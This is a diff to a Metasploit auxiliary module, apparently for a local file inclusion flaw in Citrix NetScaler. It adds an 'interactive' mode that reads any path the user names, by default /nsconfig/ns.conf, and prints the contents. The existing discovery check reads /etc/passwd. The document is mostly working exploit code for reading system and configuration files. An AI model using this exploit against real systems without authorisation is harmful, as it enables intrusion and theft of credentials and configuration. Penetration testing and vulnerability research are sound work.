@@ -40,6 +40,8 @@ class MetasploitModule < Msf::Auxiliary
     ))
 
     register_options([
+      OptEnum.new('MODE', [true, 'Start type.', 'discovery', [ 'discovery', 'interactive']]),
+      OptString.new('PATH', [false, 'File or directory you want to read', '/nsconfig/ns.conf']),
       OptString.new('TARGETURI', [true, 'Base path', '/'])
     ])
   end
@@ -132,13 +134,23 @@ class MetasploitModule < Msf::Auxiliary
       print_status("#{@message_prefix} - Re-breaking session...")
       create_session
 
-      response = read_lfi('/etc/passwd'.gsub('/', '%2F'), var_rand)
-      if response.code == 406
-        if response.body.include? ('root:*:0:0:')
-          print_warning("#{@message_prefix} - Vulnerable.")
+      case datastore['MODE']
+      when /discovery/
+        response = read_lfi('/etc/passwd'.gsub('/', '%2F'), var_rand)
+        if response.code == 406
+          if response.body.include? ('root:*:0:0:')
+            print_warning("#{@message_prefix} - Vulnerable.")
 
-          return Exploit::CheckCode::Vulnerable
+            return Exploit::CheckCode::Vulnerable
+          end
         end
+      when /interactive/
+        response = read_lfi(datastore['PATH'].gsub('/', '%2F'), var_rand)
+        if response.code == 406
+          print_line("#{response.body}")
+        end
+
+        return
       end
     end
     print_good("#{@message_prefix} - Not Vulnerable.")
